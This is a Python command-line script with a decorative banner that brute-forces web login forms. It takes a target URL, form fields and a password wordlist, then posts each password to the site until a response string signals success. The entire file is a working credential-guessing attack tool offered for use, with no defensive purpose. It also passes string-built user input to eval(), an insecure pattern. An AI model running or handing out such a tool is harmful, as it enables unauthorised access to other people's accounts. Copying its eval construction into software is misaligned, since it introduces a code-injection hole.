import requests
import os,sys
import json
#coder : $0ul
#date  : 25/2/2022
os.system("clear")
#banner
def banner():
    banner = """\033[1;34m
           ╭━━━╮╱╱╱╱╱╱╭━━╮╱╱╱╱╱╭╮╱╱╱╱╭━╮
           ┃╭━━╯╱╱╱╱╱╱┃╭╮┃╱╱╱╱╭╯╰╮╱╱╱┃╭╯
           ┃╰━━┳━━┳╮╭╮┃╰╯╰┳━┳╮┣╮╭╋━━┳╯╰┳━━┳━┳━━┳━━╮
           ┃╭━━┫╭╮┣╋╋╯┃╭━╮┃╭┫┃┃┃┃┃┃━╋╮╭┫╭╮┃╭┫╭━┫┃━┫
           ┃┃╱╱┃╰╯┣╋╋╮┃╰━╯┃┃┃╰╯┃╰┫┃━┫┃┃┃╰╯┃┃┃╰━┫┃━┫
           ╰╯╱╱╰━━┻╯╰╯╰━━━┻╯╰━━┻━┻━━╯╰╯╰━━┻╯╰━━┻━━╯
  \033[0m\033[1;30m
         ▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒
         ▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒
         ▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒
         ▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒
         ▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒
         ▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒
         ▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒
         ▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒
         ▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒
         ▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒
         ▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒
         ▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░▒
         ▒░░░░░░░░████████████████████████░░░░░░░░░░▒
         ▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒
         ▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒
         ▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒
         ▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒
         ▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒
         ▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒
         ▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒
         ▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████
         ▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████
         ▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████
         ▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████   
   \033[0m"""
    print(banner)
banner()
print("")
#target url 
url = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Enter Target Url     \033[1;32m:\033[1;37m ")
form_data = {}
os.system("clear")
while True : 
     banner()
     print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Target Url           \033[1;32m:\033[1;37m {url}")
     print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Data \033[1;32m:\033[1;32m {form_data}")
     key = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Enter field name     \033[1;32m:\033[1;37m ")
     val = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Enter field value    \033[1;32m:\033[1;37m ")
     stop = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Finished             \033[1;32m:\033[1;37m ")
     values = "{'" + key + "':'" + val + "'}"
     data = eval(values)
     form_data.update(data)
     new = json.dumps(form_data)
     os.system("clear")
     if stop == "t" :
        banner()
        print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Target Url          \033[1;32m:\033[1;37m {url}")
        print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Data \033[1;32m:\033[1;32m {form_data}")
        file = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Enter Password List \033[1;32m:\033[1;37m ")
        print("")
        passwords = []
        pw_list = open(file,"r")
        pw = pw_list.readlines()
        for word_list in pw:
            word = word_list.strip()
            passwords.append(word)
        total = len(passwords)
        load = 0
        print(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Menu\033[0m")
        print("\033[1;37m     -----\033[0m")
        print("    \033[1;34m(\033[1;31m1\033[1;34m)\033[1;32m.\033[1;33m Error")
        print("    \033[1;34m(\033[1;31m2\033[1;34m)\033[1;32m.\033[1;33m Success")
        print("")
        opt = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Choose an option   \033[1;32m:\033[1;37m ")
        if opt == "1":
           error_status = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Error Status       \033[1;32m:\033[1;37m")
           print("")
           error_status = error_status.lower()
           for password in passwords:
               load = load + 1
               str_data = str(new)
               replace_data = str_data.replace('""','password')
               post_data = eval(replace_data)
               req = requests.post(url,data=post_data)
               if error_status in req.text.lower() :
                  print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Status \033[1;37m:\033[1;31m Failed! \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Total \033[1;37m:\033[1;37m {total} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Loaded \033[1;37m:\033[1;37m {load:4} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Password \033[1;37m:\033[1;31m {password}\033[0m")
                  pass
               else :
                  print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Status \033[1;37m:\033[1;32m Success \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Total \033[1;37m:\033[1;37m {total} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Loaded \033[1;37m:\033[1;37m {load:4} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Password \033[1;37m:\033[1;32m {password}\033[0m")
                  break
        elif opt == "2" :
           success_status = input(" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Success Status     \033[1;32m: \033[1;37m")
           print("")
           success_status = success_status.lower()
           for password in passwords:
               load = load + 1
               str_data = str(new)
               replace_data = str_data.replace('""','password')
               post_data = eval(replace_data)
               req = requests.post(url,data=post_data)
               if success_status in req.text.lower() :
                  print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Status \033[1;37m:\033[1;32m Success \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Total \033[1;37m:\033[1;37m {total} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Loaded \033[1;37m:\033[1;37m {load:4} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Password \033[1;37m:\033[1;32m {password}\033[0m")
                  break
               else :
                  print(f" \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Status \033[1;37m:\033[1;31m Failed! \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Total \033[1;37m:\033[1;37m {total} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Loaded \033[1;37m:\033[1;37m {load:4} \033[1;34m[\033[1;31m+\033[1;34m]\033[1;33m Password \033[1;37m:\033[1;31m {password}\033[0m")
                  pass
        break
     else :
        pass
